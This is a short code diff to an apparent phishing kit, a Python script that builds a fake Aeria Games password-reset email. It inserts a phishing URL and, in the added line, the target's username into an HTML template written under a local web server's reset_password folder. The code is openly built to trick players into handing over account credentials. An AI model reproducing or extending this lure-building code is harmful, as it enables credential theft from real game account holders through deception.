@@ -97,6 +97,7 @@ def gf():
 
     url_phish = str(correo)
     url_phish = url_phish.replace('[url]', str(phish_url))
+    url_phish = url_phish.replace('[name]', str(Username))
     
     with open('C:\\xampp\\htdocs\\aeriagames\\reset_password\\correo.html', 'w') as file:
         file.write(url_phish.encode('utf8').decode('ascii', 'ignore'))
